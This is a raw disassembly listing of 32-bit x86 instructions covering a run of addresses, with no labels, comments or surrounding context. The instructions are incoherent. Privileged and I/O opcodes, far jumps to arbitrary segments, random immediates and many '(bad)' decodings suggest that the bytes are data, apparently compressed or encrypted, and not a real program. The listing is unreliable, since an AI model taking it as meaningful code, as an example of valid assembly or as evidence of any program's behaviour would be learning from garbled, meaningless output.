  4956ec:	dec    DWORD PTR ds:0xb819eb61
  4956f2:	sbb    esi,edi
  4956f4:	jp     0x4956b5
  4956f6:	mov    edi,0xc7c2d39
  4956fb:	sub    DWORD PTR [edi],ecx
  4956fd:	inc    DWORD PTR ds:0x9debf597
  495703:	inc    edx
  495704:	jno    0x495763
  495706:	add    ah,BYTE PTR [ecx-0x564f1234]
  49570c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49570d:	or     BYTE PTR [esi],0x14
  495710:	jmp    0xb4a3:0x802dfc75
  495717:	das    
  495718:	lods   al,BYTE PTR ds:[esi]
  495719:	push   0x82c8e949
  49571e:	and    BYTE PTR [ebx+0x6846c187],ah
  495724:	push   0x4a153b08
  495729:	pushf  
  49572a:	out    dx,eax
  49572b:	aad    0x35
  49572d:	addr16 push cs
  49572f:	cdq    
  495730:	xor    al,0x18
  495732:	inc    edi
  495733:	xor    eax,0xcfb81626
  495738:	jbe    0x495775
  49573a:	push   ebx
  49573b:	aaa    
  49573c:	add    eax,0xd0c1826
  495741:	and    BYTE PTR [eax+0x3e],dl
  495744:	lods   eax,DWORD PTR ds:[esi]
  495745:	jb     0x4957c2
  495747:	sbb    al,0x24
  495749:	mov    cr4,esi
  49574c:	push   esi
  49574d:	sbb    BYTE PTR [ebp+0x15],dh
  495750:	fsubr  DWORD PTR [ebx]
  495752:	(bad)  
  495754:	and    BYTE PTR [esi+edx*2],bl
  495757:	xor    ebx,DWORD PTR [esi]
  495759:	push   edx
  49575a:	push   ebx
  49575b:	jmp    0x495769
  49575d:	pop    ss
  49575e:	ins    DWORD PTR es:[edi],dx
  49575f:	xor    bl,0x7c
  495762:	push   esi
  495763:	push   esi
  495764:	push   edx
  495765:	push   esi
  495766:	sbb    al,BYTE PTR [ebx-0x2a]
  495769:	jae    0x495792
  49576b:	add    al,0xee
  49576d:	repnz stos BYTE PTR es:[edi],al
  49576f:	shr    BYTE PTR [esi-0x34],cl
  495772:	or     al,0x86
  495774:	mov    cl,0xe7
  495776:	cmp    DWORD PTR [edx+0x64],esi
  495779:	shr    BYTE PTR [esi-0x32],1
  49577c:	outs   dx,BYTE PTR ds:[esi]
  49577d:	les    ebp,FWORD PTR [esi+0x17]
  495780:	(bad)  
  495781:	call   0x33ca:0x6ec8c9dc
  495788:	push   ss
  495789:	adc    al,0xb4
  49578b:	push   cs
  49578c:	sbb    eax,eax
  49578e:	jae    0x49576d
  495790:	fnsave [esi+ebx*1-0x46b63947]
  495797:	adc    BYTE PTR [eax],dl
  495799:	add    ecx,DWORD PTR [edi-0x4095abdc]
  49579f:	adc    al,0x90
  4957a1:	push   edx
  4957a2:	pop    esp
  4957a3:	add    cl,BYTE PTR [ebx]
  4957a5:	cmp    edx,0x6b
  4957a8:	jge    0x4957ab
  4957aa:	outs   dx,DWORD PTR ds:[esi]
  4957ab:	mov    ds:0x8b761388,eax
  4957b0:	retf   
  4957b1:	or     ch,BYTE PTR es:[esi+0x691e6ba0]
  4957b8:	add    eax,0x58510156
  4957bd:	push   ebx
  4957be:	pop    edx
  4957bf:	dec    edx
  4957c0:	loope  0x4957fb
  4957c2:	icebp  
  4957c3:	jnp    0x495767
  4957c5:	daa    
  4957c6:	mov    ah,0xd0
  4957c8:	loop   0x495781
  4957ca:	jne    0x49579f
  4957cc:	push   esi
  4957cd:	das    
  4957ce:	stos   BYTE PTR es:[edi],al
  4957cf:	dec    eax
  4957d0:	mov    ecx,DWORD PTR ds:0x6a85a1bb
  4957d6:	loopne 0x4957b9
  4957d8:	idiv   BYTE PTR [edx+0x1c]
  4957db:	mov    ah,0x16
  4957dd:	push   0xcc317db3
  4957e2:	and    bh,BYTE PTR [ebx]
  4957e4:	sar    BYTE PTR [edi+0x1e],1
  4957e7:	push   cs
  4957e8:	jle    0x495808
  4957ea:	jge    0x495806
  4957ec:	fwait
  4957ed:	int    0xf6
  4957ef:	test   al,ah
  4957f1:	dec    edx
  4957f2:	and    bh,BYTE PTR [esi+esi*8+0x7f]
  4957f6:	bnd jle 0x495801
  4957f9:	or     al,0x62
  4957fb:	data16 or dh,BYTE PTR [ecx]
  4957fe:	call   0x4c33f517
  495803:	xor    dl,BYTE PTR [esi]
  495805:	add    esp,DWORD PTR [esi+0xb]
  495808:	pop    es
  495809:	out    0xba,eax
  49580b:	inc    edi
  49580c:	xor    eax,0xd7536b6
  495811:	test   al,0x5
  495813:	pop    ebx
  495814:	setge  cl
  495817:	pop    es
  495818:	in     eax,dx
  495819:	dec    edx
  49581a:	scas   al,BYTE PTR es:[di]
  49581c:	sbb    esp,esp
  49581e:	pushf  
  49581f:	ror    DWORD PTR [ebx+0x110fb41c],0x3a
  495826:	adc    BYTE PTR [ebp*4+0x11c18030],0xae
  49582e:	xor    al,0xc
  495830:	imul   al
  495832:	xor    al,0x2a
  495834:	push   0x6
  495836:	lods   eax,DWORD PTR ds:[esi]
  495837:	jecxz  0x495842
  495839:	mov    bh,0xc5
  49583b:	retf   0xb25
  49583e:	inc    eax
  49583f:	pusha  
  495840:	and    al,0x4e
  495842:	add    DWORD PTR [esi+edi*1-0x782512e7],ebx
  495849:	push   ss
  49584a:	jbe    0x495814
  49584c:	add    al,0x9b
  49584e:	push   es
  49584f:	mov    al,ds:0x27c0899d
  495854:	cli    
  495855:	ret    0x8a6f
  495858:	sbb    al,bl
  49585a:	push   0x7b
  49585c:	ret    0xd381
  49585f:	test   eax,0x81e1c8da
  495864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495865:	xchg   esp,eax
  495866:	loope  0x4958c2
  495868:	mov    ebx,0x80f0d110
  49586d:	add    al,ah
  49586f:	adc    eax,0xd50007dd
  495874:	loopne 0x49582c
  495876:	in     eax,dx
  495877:	push   ss
  495878:	push   ebx
  495879:	dec    ebp
  49587a:	jmp    0x4640:0x36d30bb3
  495881:	ret    0x5785
  495884:	lock hlt 
  495886:	and    al,0xf2
  495888:	xchg   esp,edi
  49588a:	outs   dx,BYTE PTR ds:[esi]
  49588b:	or     eax,edx
  49588d:	inc    eax
  49588e:	push   edi
  49588f:	(bad)  
  495890:	push   DWORD PTR [ebx+0xc]
  495893:	jmp    0x495903
  495895:	std    
  495896:	int    0xb7
  495898:	mov    esp,0xa7c0734
  49589d:	jg     0x49588c
  49589f:	iret   
  4958a0:	es inc ecx
  4958a2:	xchg   ebx,eax
  4958a3:	ja     0x49588a
  4958a5:	push   ebx
  4958a6:	sub    ch,dl
  4958a8:	add    dl,0xd
  4958ab:	push   cs
  4958ac:	xor    esp,ecx
  4958ae:	add    DWORD PTR [ebp+0x75f55edd],ecx
  4958b4:	adc    eax,DWORD PTR [edx]
  4958b6:	inc    esi
  4958b7:	lea    eax,[ecx+0x798d63f9]
  4958bd:	push   ebx
  4958be:	pop    ds
  4958bf:	inc    eax
  4958c0:	mov    esp,0x84d12f8
  4958c5:	add    eax,DWORD PTR [ebx]
  4958c7:	or     esp,DWORD PTR [edi]
  4958c9:	pop    eax
  4958ca:	adc    ch,BYTE PTR [ecx]
  4958cc:	in     al,dx
  4958cd:	add    BYTE PTR [eax+0x1c949394],ah
  4958d3:	loopne 0x49592c
  4958d5:	pop    ebx
  4958d6:	clc    
  4958d7:	jno    0x4958d0
  4958d9:	lea    eax,[ebx+eax*1-0x11]
  4958dd:	mov    WORD PTR [ebp+0x20eba41],cs
  4958e3:	mov    esp,es
  4958e5:	mov    ebx,edx
  4958e7:	in     al,0xc5
  4958e9:	xor    BYTE PTR [ebp+ebp*8-0xa],ch
  4958ed:	sub    eax,edi
  4958ef:	sbb    edx,ebx
  4958f1:	mov    esp,0x925180bb
  4958f6:	push   ebx
  4958f7:	and    eax,0x175ec41c
  4958fc:	dec    ebx
  4958fd:	fcom   DWORD PTR [ecx]
  4958ff:	push   ebp
  495900:	hlt    
  495901:	jecxz  0x495982
  495903:	dec    ebp
  495904:	xor    eax,0x389c0af8
  495909:	cmp    al,0x47
  49590b:	mov    WORD PTR [ecx-0x1f7cf839],es
  495911:	mov    ch,0x5a
  495913:	sub    BYTE PTR [esi],0x4a
  495916:	and    ecx,0xa5df1499
  49591c:	xor    dh,ah
  49591e:	sahf   
  49591f:	dec    ecx
  495920:	or     ecx,0xfffffffc
  495923:	inc    ecx
  495924:	mov    ds:0xbc2c2e12,al
  495929:	call   0xce7a:0xfcb7774b
  495930:	add    eax,0x4127b99f
  495935:	add    edi,ebx
  495937:	outs   dx,DWORD PTR ds:[esi]
  495938:	and    al,0xc3
  49593a:	ret    0xeb6e
  49593d:	xor    dh,BYTE PTR [esi]
  49593f:	jns    0x4959b4
  495941:	or     bh,BYTE PTR [eax-0x59]
  495944:	sbb    DWORD PTR [edx],0x6a34fc1a
  49594a:	pop    ebx
  49594b:	adc    BYTE PTR [ebx+0x4f],dl
  49594e:	xor    ah,dh
  495950:	mov    dh,0xa0
  495952:	popa   
  495953:	adc    ebx,DWORD PTR [ebx+eiz*8-0x3e]
  495957:	adc    al,0x1c
  495959:	cdq    
  49595a:	cs scas al,BYTE PTR es:[edi]
  49595c:	push   eax
  49595d:	mov    cl,0x60
  49595f:	or     esp,0xba34696f
  495965:	add    eax,0xef0dc07b
  49596a:	jne    0x495971
  49596c:	mov    edx,0xe488b12
  495971:	fimul  WORD PTR [edi+ebx*2]
  495974:	fidivr WORD PTR [ecx]
  495976:	inc    edx
  495977:	add    al,0x7d
  495979:	or     eax,0x8a1c0e36
  49597e:	jl     0x49597a
  495980:	fnstenv [ebx-0x75ff2214]
  495986:	adc    BYTE PTR [ebx],ch
  495988:	add    al,0x8a
  49598a:	test   al,0xdc
  49598c:	xor    al,0xdb
  49598e:	test   BYTE PTR [ebx],cl
  495990:	ds push ebx
  495992:	cld    
  495993:	push   DWORD PTR [eax]
  495995:	mov    cl,0x7
  495997:	test   al,0x86
  495999:	pusha  
  49599a:	cmp    eax,DWORD PTR [eax]
  49599c:	pop    ecx
  49599d:	cdq    
  49599e:	cld    
  49599f:	es push 0x46fe439b
  4959a5:	clc    
  4959a6:	jmp    0xf008:0x18568957
  4959ad:	icebp  
  4959ae:	neg    ah
  4959b0:	outs   dx,DWORD PTR ds:[esi]
  4959b1:	nop
  4959b2:	call   DWORD PTR [ebx-0x13]
  4959b5:	push   0x3c
  4959b7:	dec    ebx
  4959b8:	inc    ebp
  4959b9:	inc    eax
  4959ba:	xchg   eax,esi
  4959bc:	mov    al,BYTE PTR [esi-0x25]
  4959bf:	sub    ebx,DWORD PTR [edx]
  4959c1:	ds pop edi
  4959c3:	mov    DWORD PTR [esi+0x60],ebx
  4959c6:	stos   DWORD PTR es:[edi],eax
  4959c7:	add    dl,BYTE PTR [ebx]
  4959c9:	daa    
  4959ca:	fld    DWORD PTR ss:[esp+ebx*2+0xfecc9b5]
  4959d2:	pop    ecx
  4959d3:	lock dec ebx
  4959d5:	jae    0x49595e
  4959d7:	or     al,0xe8
  4959d9:	mov    eax,0xabf00ac9
  4959de:	add    eax,0x78e8979c
  4959e3:	adc    BYTE PTR [esi+0x57],ah
  4959e6:	push   esi
  4959e7:	(bad)  
  4959e8:	adc    eax,esi
  4959ea:	in     eax,0x53
  4959ec:	xor    edi,edi
  4959ee:	jge    0x495a04
  4959f0:	inc    edi
  4959f1:	(bad)  
  4959f2:	neg    eax
  4959f4:	neg    edx
  4959f6:	sbb    eax,0x64
  4959f9:	nop
  4959fa:	ja     0x4959cb
  4959fc:	jb     0x495a24
  4959fe:	mov    DWORD PTR [esi+esi*1],ebx
  495a01:	sbb    al,0x18
  495a03:	(bad)  
  495a05:	rcr    BYTE PTR [ecx+0x7f186d1c],0xbe
  495a0c:	xchg   ecx,eax
  495a0d:	loope  0x495a15
  495a0f:	ins    DWORD PTR es:[edi],dx
  495a10:	adc    al,bl
  495a12:	xor    edx,DWORD PTR [ebp+edi*4-0x7f]
  495a16:	inc    DWORD PTR [esi]
  495a18:	test   eax,0xd9d1ebd1
  495a1d:	ins    DWORD PTR es:[edi],dx
  495a1e:	fisttp DWORD PTR [edx+edx*2]
  495a21:	test   eax,0x181cf134
  495a26:	adc    al,0xb
  495a28:	jo     0x4959b6
  495a2a:	mov    WORD PTR [eax],ss
  495a2c:	dec    edi
  495a2d:	or     BYTE PTR [edx+eax*4-0x6d66ade6],bl
  495a34:	pop    edi
  495a35:	adc    DWORD PTR [esi+0x282981e0],eax
  495a3b:	pop    ebp
  495a3c:	adc    BYTE PTR ds:0x5999cf0c,ah
  495a42:	dec    ecx
  495a43:	push   ss
  495a44:	sbb    al,0xa5
  495a46:	adc    eax,DWORD PTR ss:[ecx-0xe8cb310]
  495a4d:	xor    eax,0xa0c81418
  495a52:	add    esp,DWORD PTR [ecx+0x49]
  495a55:	sbb    eax,ebp
  495a57:	adc    DWORD PTR [eax],ecx
  495a59:	pop    es
  495a5a:	inc    DWORD PTR [eax-0x14b186b1]
  495a60:	push   ebx
  495a61:	popa   
  495a62:	iret   
  495a63:	cmp    edx,DWORD PTR [eax]
  495a65:	and    BYTE PTR es:[ecx-0x38],0xce
  495a6a:	xchg   ecx,eax
  495a6b:	or     BYTE PTR [eax+0x14c20532],dh
  495a71:	leave  
  495a72:	push   cs
  495a73:	or     BYTE PTR [ebx],ch
  495a75:	add    bh,BYTE PTR [ebx-0x22]
  495a78:	fstp   DWORD PTR [edx]
  495a7a:	adc    al,0x1b
  495a7c:	push   cs
  495a7d:	or     al,0x10
  495a7f:	call   0x5f18:0x40b01571
  495a86:	repz pop edi
  495a88:	xchg   edx,eax
  495a89:	or     ebp,DWORD PTR ds:0x15936cd7
  495a8f:	dec    ecx
  495a90:	inc    edx
  495a91:	sbb    eax,0x2708e14
  495a96:	cli    
  495a97:	retf   
  495a98:	pop    eax
  495a99:	sbb    al,BYTE PTR [esi]
  495a9b:	fisttp WORD PTR [ebx+0x3d688dd6]
  495aa1:	push   ecx
  495aa2:	scas   eax,DWORD PTR es:[edi]
  495aa3:	je     0x495aa8
  495aa5:	dec    edi
  495aa6:	jbe    0x495a56
  495aa8:	les    ecx,FWORD PTR [eax]
  495aaa:	loop   0x495b24
  495aac:	aam    0xdd
  495aae:	jo     0x495a60
  495ab0:	mov    ah,0x4e
  495ab2:	push   ebx
  495ab3:	mov    edi,0xba02bfe9
  495ab8:	shr    BYTE PTR [ebx],0x58
  495abb:	lsl    eax,cx
  495abe:	sbb    ecx,ecx
  495ac0:	or     eax,ecx
  495ac2:	pop    ecx
  495ac3:	jmp    0x23acead8
  495ac8:	mov    ds:0x696b072b,al
  495acd:	pusha  
  495ace:	mov    bl,0x43
  495ad0:	call   0x44327d13
  495ad5:	pusha  
  495ad6:	fbstp  TBYTE PTR [ebx+edx*1-0x57]
  495ada:	loope  0x495ae2
  495adc:	jbe    0x495a69
  495ade:	or     BYTE PTR [esi+0x30],0x3d
  495ae2:	add    esi,DWORD PTR [edx+0x186f3b0c]
  495ae8:	pop    es
  495ae9:	nop
  495aea:	mul    eax
  495aec:	repnz in eax,dx
  495aee:	cmp    BYTE PTR [eax],al
  495af0:	(bad)  [eax-0x14]
  495af3:	in     al,dx
  495af4:	sbb    BYTE PTR [eax],0x15
  495af7:	fwait
  495af8:	js     0x495b42
  495afa:	js     0x495b74
  495afc:	adc    al,0xaa
  495afe:	(bad)  
  495aff:	push   edx
  495b00:	pop    ebx
  495b01:	dec    eax
  495b02:	clc    
  495b03:	cwde   
  495b04:	jbe    0x3055a2f1
  495b0a:	inc    edx
  495b0b:	xor    eax,0x8002b84d
  495b10:	cmp    al,0x30
  495b12:	into   
  495b13:	(bad)  
  495b14:	inc    eax
  495b15:	dec    edx
  495b16:	jp     0x495b3c
  495b18:	mov    bh,0x4a
  495b1a:	(bad)  
  495b1b:	jb     0x495b03
  495b1d:	mov    DWORD PTR [ebx+ecx*4+0x3d],eax
  495b21:	aad    0x45
  495b23:	xor    BYTE PTR [esi+0x6a56c066],bl
  495b29:	or     DWORD PTR ds:0xa15dd238,esp
  495b2f:	xlat   BYTE PTR ds:[ebx]
  495b30:	sub    BYTE PTR [ebx-0x3d71d6ae],0x62
  495b37:	sbb    DWORD PTR [edx],esp
  495b39:	jne    0x495b87
  495b3b:	int    0xc5
  495b3d:	aam    0xb
  495b3f:	add    bh,BYTE PTR [edx+0x29]
  495b42:	mov    ch,dh
  495b44:	or     BYTE PTR [ebx],dl
  495b46:	rcl    BYTE PTR [ebp+0x13],0x4c
  495b4a:	and    dh,dh
  495b4c:	call   0x4606:0xe789c242
  495b53:	data16 xor BYTE PTR [esi+0x2],al
  495b57:	stos   DWORD PTR es:[edi],eax
  495b58:	scas   eax,DWORD PTR es:[edi]
  495b59:	xchg   ebp,eax
  495b5a:	imul   edx,edi,0xce752bb2
  495b60:	adc    ch,BYTE PTR [edi+0x57]
  495b63:	xor    al,dl
  495b65:	and    BYTE PTR [ecx],al
  495b67:	mov    ch,0x75
  495b69:	push   ebp
  495b6a:	pop    es
  495b6b:	add    bh,BYTE PTR [esi+eax*2-0x37c73fc1]
  495b72:	into   
  495b73:	jmp    0x495b77
  495b75:	in     al,0x46
  495b77:	xor    DWORD PTR [ecx],0x6d
  495b7a:	or     edi,ebp
  495b7c:	dec    cx
  495b7e:	(bad)  
  495b7f:	sbb    al,cl
  495b81:	push   edi
  495b82:	push   edi
  495b83:	sbb    esp,DWORD PTR [ecx+0x55ae10a5]
  495b89:	(bad)  
  495b8a:	sbb    eax,0xf668806d
  495b8f:	dec    esp
  495b90:	shl    BYTE PTR [ecx-0x147c0b40],1
  495b96:	push   cs
  495b97:	dec    eax
  495b98:	and    eax,0xc493e321
  495b9d:	xchg   ebp,eax
  495b9e:	push   eax
  495b9f:	add    DWORD PTR es:[edi-0x59],edx
  495ba3:	adc    al,0xd7
  495ba5:	pop    ebx
  495ba6:	test   al,0x6
  495ba8:	mov    eax,ds:0xa0078a20
  495bad:	push   es
  495bae:	jno    0x495c2f
  495bb0:	es and ch,bl
  495bb3:	add    eax,0xd0226b0c
  495bb8:	cdq    
  495bb9:	cmp    ah,dl
  495bbb:	mov    bh,0x6
  495bbd:	dec    esp
  495bbe:	rcl    al,cl
  495bc0:	cmp    al,0x56
  495bc2:	cmp    edi,ebx
  495bc4:	pop    ds
  495bc5:	retf   0x181c
  495bc8:	in     eax,dx
  495bc9:	mov    ds:0x76703e1e,eax
  495bce:	add    ebx,DWORD PTR [eax]
  495bd0:	cmp    eax,0x83097652
  495bd5:	adc    bl,BYTE PTR [eax+0x18]
  495bd8:	out    dx,al
  495bd9:	jmp    0x495c2b
  495bdb:	inc    esp
  495bdc:	adc    ah,BYTE PTR [eax]
  495bde:	rol    BYTE PTR [edi-0x5700c5fe],1
  495be4:	lahf   
  495be5:	jne    0x495c05
  495be7:	and    al,0xce
  495be9:	jno    0x495b8c
  495beb:	sub    al,0x8f
  495bed:	mov    eax,DWORD PTR gs:[eax]
  495bf0:	in     eax,0xde
  495bf2:	and    eax,edi
  495bf4:	fsub   QWORD PTR [ebx-0x15]
  495bf7:	pop    edx
  495bf8:	inc    eax
  495bf9:	cmp    al,0x40
  495bfb:	mov    eax,ds:0x25409cd8
  495c00:	inc    eax
  495c01:	sbb    dl,dl
  495c03:	push   ebx
  495c04:	(bad)  
  495c05:	loopne 0x495b89
  495c07:	xor    al,0x27
  495c09:	and    ah,BYTE PTR [edx-0x2f]
  495c0c:	inc    ecx
  495c0d:	adc    eax,0x26ec42b8
  495c12:	hlt    
  495c13:	cmp    dl,BYTE PTR [eax+0x1a]
  495c16:	in     al,dx
  495c17:	ror    ebp,0xa3
  495c1a:	pop    edx
  495c1b:	dec    esp
  495c1c:	inc    esi
  495c1d:	dec    BYTE PTR [ecx+0x7]
  495c20:	dec    ebp
  495c21:	xchg   esi,eax
  495c22:	add    bl,BYTE PTR [eax]
  495c24:	dec    ebx
  495c25:	cmc    
  495c26:	(bad)  
  495c27:	in     al,dx
  495c28:	out    dx,al
  495c29:	ficomp DWORD PTR [ebx-0x3e]
  495c2c:	cmp    DWORD PTR [eax],0xf0832acb
  495c32:	add    esi,DWORD PTR [ebp+0x24]
  495c35:	ja     0x495c36
  495c37:	test   DWORD PTR [esi],edx
  495c39:	in     al,dx
  495c3a:	cmp    eax,0x19930520
  495c3f:	je     0x495c56
  495c41:	cmp    eax,0x3d0e0d21
  495c46:	and    cl,BYTE PTR [edi+eax*2+0x3]
  495c4a:	sub    eax,DWORD PTR [edi]
  495c4c:	cmp    eax,0x50fe0210
  495c51:	aam    0x15
  495c53:	inc    esp
  495c54:	cli    
  495c55:	aad    0x68
  495c57:	push   cs
  495c58:	repnz inc ecx
  495c5a:	pop    eax
  495c5b:	pop    eax
  495c5c:	test   eax,0xc38400a0
  495c61:	mov    eax,ds:0x3aa4e4a6
  495c66:	test   al,0x5e
  495c68:	dec    ebx
  495c69:	shr    ecx,1
  495c6b:	(bad)  
  495c6c:	xor    ch,bh
  495c6e:	iret   
  495c6f:	and    BYTE PTR [edi+0x9],dh
  495c72:	aas    
  495c73:	sub    BYTE PTR [ecx-0x7f752ec0],bl
  495c79:	sbb    al,0x1a
  495c7b:	and    al,BYTE PTR [esp+ebp*1+0x5a7ee814]
  495c82:	and    al,0xe8
  495c84:	mov    edx,ecx
  495c86:	jb     0x495c73
  495c88:	fsub   QWORD PTR [esi+0x43]
  495c8b:	or     edx,DWORD PTR [ecx]
  495c8d:	les    esi,FWORD PTR [ecx-0x65]
  495c90:	retf   
  495c91:	out    dx,eax
  495c92:	popa   
  495c93:	mov    ah,0xb0
  495c95:	sar    bl,1
  495c97:	xor    eax,0xeb06e828
  495c9c:	inc    ebx
  495c9d:	push   ebp
  495c9e:	xchg   esp,eax
  495c9f:	sbb    dh,BYTE PTR [ecx]
  495ca1:	jecxz  0x495cf8
  495ca3:	call   0xf06f9c2c
  495ca8:	cmp    eax,0x33470174
  495cad:	pop    ecx
  495cae:	lea    esi,[esi+eax*2+0x15]
  495cb2:	jo     0x495c85
  495cb4:	cdq    
  495cb5:	sub    eax,0x430e675
  495cba:	inc    edi
  495cbb:	push   edi
  495cbc:	pop    esp
  495cbd:	inc    esp
  495cbe:	pop    ebp
  495cbf:	xchg   esp,ecx
  495cc1:	inc    ebp
  495cc2:	ret    0x7868
  495cc5:	inc    edx
  495cc6:	jbe    0x495c9e
  495cc8:	bound  esp,QWORD PTR [edi+ebp*8]
  495ccb:	gs xchg edi,eax
  495ccd:	jmp    0x495d04
  495ccf:	outs   dx,DWORD PTR ds:[esi]
  495cd0:	xchg   edi,eax
  495cd1:	lods   eax,DWORD PTR ds:[esi]
  495cd2:	fmul   DWORD PTR [esi+0x2]
  495cd5:	jbe    0x495d4f
  495cd7:	add    edx,eax
  495cd9:	push   0x2
  495cdb:	gs pusha 
  495cdd:	lock add ecx,DWORD PTR es:[ecx]
  495ce1:	mov    esi,0x50575641
  495ce6:	mov    eax,0x3363d081
  495ceb:	jne    0x495d36
  495ced:	push   es
  495cee:	lea    esi,[esi+edi*2]
  495cf1:	enter  0x5b78,0x9b
  495cf5:	icebp  
  495cf6:	(bad)  
  495cf9:	add    eax,0x27f722a8
  495cfe:	and    eax,0x8623e215
  495d03:	or     eax,0x2984870c
  495d08:	pop    ecx
  495d09:	mov    esp,0x86d69265
  495d0e:	ret    
  495d0f:	dec    edx
  495d10:	push   0x20e4fe68
  495d15:	or     al,0x8f
  495d17:	and    dx,WORD PTR [ecx+0x56]
  495d1b:	inc    esi
  495d1c:	loope  0x495d0c
  495d1e:	test   BYTE PTR [ebp-0x380ed510],dh
  495d24:	pop    es
  495d25:	sub    DWORD PTR [ebx],0xffffff86
  495d28:	les    esi,FWORD PTR [ecx]
  495d2a:	jo     0x495d35
  495d2c:	retf   0x416
  495d2f:	mov    esi,ecx
  495d31:	mov    cl,0xb0
  495d33:	xor    DWORD PTR [ecx],0x17404e14
  495d39:	sbb    esi,ecx
  495d3b:	sbb    edx,DWORD PTR [ebx+0x6a]
  495d3e:	and    bl,BYTE PTR [eax+ebp*8+0x1a]
  495d42:	inc    DWORD PTR [ebx]
  495d44:	retf   
  495d45:	call   0x92915e20
  495d4a:	or     BYTE PTR ds:0xe71c3aee,dl
  495d50:	fs sti 
  495d52:	cmp    ebp,DWORD PTR [eax]
  495d54:	js     0x495d95
  495d56:	xchg   ebx,eax
  495d57:	inc    ebx
  495d58:	enter  0xc295,0xa
  495d5c:	or     DWORD PTR [ebp-0x44],esi
  495d5f:	dec    esi
  495d60:	push   es
  495d61:	shl    BYTE PTR [eax+0x4effb623],0xfe
  495d68:	sub    bl,dh
  495d6a:	and    eax,ebp
  495d6c:	test   eax,0xc5b67652
  495d71:	daa    
  495d72:	jl     0x495d61
  495d74:	push   ss
  495d75:	popf   
  495d76:	call   0xee4c67c6
  495d7b:	sub    eax,0x8
  495d7e:	fidivr DWORD PTR [edi]
  495d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495d81:	sub    esi,DWORD PTR [edx]
  495d83:	jne    0x495d99
  495d85:	adc    eax,0x7a4724ff
  495d8a:	loop   0x495d4d
  495d8c:	pop    es
  495d8d:	outs   dx,DWORD PTR ds:[esi]
  495d8e:	jmp    0x495d94
  495d90:	push   edx
  495d91:	inc    edx
  495d92:	cs pop esp
  495d94:	je     0x495d8c
  495d96:	cmp    edi,DWORD PTR [eax]
  495d98:	adc    BYTE PTR [esi+0x58],0x8
  495d9c:	pop    eax
  495d9d:	jne    0x495dbe
  495d9f:	stos   BYTE PTR es:[edi],al
  495da0:	dec    esi
  495da1:	mov    eax,0x683661d6
  495da6:	add    ah,BYTE PTR [edx]
  495da8:	add    eax,0xa6f58297
  495dad:	push   ss
  495dae:	sbb    ebx,DWORD PTR [esi]
  495db0:	dec    ebp
  495db1:	cld    
  495db2:	or     ah,BYTE PTR [edx]
  495db4:	aaa    
  495db5:	js     0x495d68
  495db7:	cld    
  495db8:	jmp    0x5c6a:0x614a10eb
  495dbf:	pop    ecx
  495dc0:	mov    BYTE PTR [edx+0x14],dl
  495dc3:	or     al,0x7e
  495dc5:	dec    esi
  495dc6:	in     al,dx
  495dc7:	rcr    DWORD PTR [edx+0x618e0d38],cl
  495dcd:	and    cl,BYTE PTR [edx]
  495dcf:	sbb    DWORD PTR [edx],ebx
  495dd1:	xor    BYTE PTR [ebx+0x66d6e081],al
  495dd7:	ins    DWORD PTR es:[edi],dx
  495dd8:	push   ebp
  495dd9:	popa   
  495dda:	mul    BYTE PTR [eax]
  495ddc:	mov    edx,0xa8ee81a1
  495de1:	and    eax,0xe3c944c
  495de6:	es adc eax,0x7820c148
  495dec:	call   0xcf0:0x3e10c2f4
  495df3:	cmp    BYTE PTR [edx+ebp*2],dl
  495df6:	imul   DWORD PTR [edx+0x1f982160]
  495dfc:	pop    es
  495dfd:	cmp    BYTE PTR [edi-0x78],ch
  495e00:	jg     0x495e36
  495e02:	fldenv [eax+0xe]
  495e05:	inc    eax
  495e06:	jno    0x495e43
  495e08:	mov    DWORD PTR ds:0xc1206674,esi
  495e0e:	cmc    
  495e0f:	push   eax
  495e10:	retf   
  495e11:	mov    ebp,DWORD PTR [edx-0x3e57c167]
  495e17:	in     al,dx
  495e18:	scas   al,BYTE PTR es:[edi]
  495e19:	(bad)  
  495e1a:	and    BYTE PTR [ebx-0x73],dl
  495e1d:	cmp    al,0x87
  495e1f:	jmp    0x495e6f
  495e21:	or     ah,0x5b
  495e24:	jecxz  0x495ea2
  495e26:	mov    ecx,DWORD PTR [esi]
  495e28:	sub    BYTE PTR [ecx-0x7ebfef08],cl
  495e2e:	mov    al,ds:0x434a733f
  495e33:	inc    edx
  495e35:	xchg   esp,eax
  495e36:	clc    
  495e37:	jns    0x495eac
  495e39:	aas    
  495e3a:	lea    eax,[ecx+ebx*2]
  495e3d:	mov    ds:0x6664b36,eax
  495e42:	in     al,dx
  495e43:	jb     0x495e79
  495e45:	sub    ebp,ebx
  495e47:	or     DWORD PTR [edx],0x273ee8c2
  495e4d:	or     DWORD PTR [ebp-0x113d210a],0x86569e0c
  495e57:	and    DWORD PTR [edx],0x48
  495e5a:	pop    ecx
  495e5b:	mov    ds:0xe059d254,eax
  495e60:	inc    edi
  495e61:	or     ah,BYTE PTR [esi-0x64]
  495e64:	pop    esp
  495e65:	jmp    0xeb4d:0x818184ac
  495e6c:	xor    al,0x0
  495e6e:	push   0xc69f8186
  495e73:	icebp  
  495e74:	fneni(8087 only) 
  495e76:	add    al,bh
  495e78:	mov    bh,BYTE PTR [eax+0x16]
  495e7b:	push   cs
  495e7c:	je     0x495e8e
  495e7e:	loop   0x495e8e
  495e80:	or     BYTE PTR [ebp-0x1f],dh
  495e83:	adc    eax,0xf0f893fd
  495e88:	push   ebx
  495e89:	sub    eax,esi
  495e8b:	lea    ebx,[eax+0x4c]
  495e8e:	push   ebx
  495e8f:	fnstenv [ebp+0x4b4c7bce]
  495e95:	or     eax,0x86b4b476
  495e9a:	add    BYTE PTR [eax],bl
  495e9c:	pop    eax
  495e9d:	pop    ebx
  495e9e:	push   0xffffffe2
  495ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495ea1:	out    0x89,al
  495ea3:	inc    eax
  495ea4:	mov    al,ds:0xdfc06132
  495ea9:	cdq    
  495eaa:	shr    BYTE PTR [ebp+ebp*1+0x57],0xbf
  495eaf:	dec    esi
  495eb0:	out    0x40,al
  495eb2:	mov    ebx,0x23c61bb
  495eb7:	mov    al,ds:0x850de454
  495ebc:	pusha  
  495ebd:	mov    ds:0xf7c4dee9,al
  495ec2:	shl    BYTE PTR [ebx+0x56344444],1
  495ec8:	jnp    0x495f20
  495eca:	(bad)  
  495ecc:	test   eax,0xf033fc75
  495ed1:	xchg   edx,eax
  495ed2:	fsub   DWORD PTR [edx]
  495ed4:	lock push cs
  495ed6:	add    BYTE PTR [eax+0x21606472],al
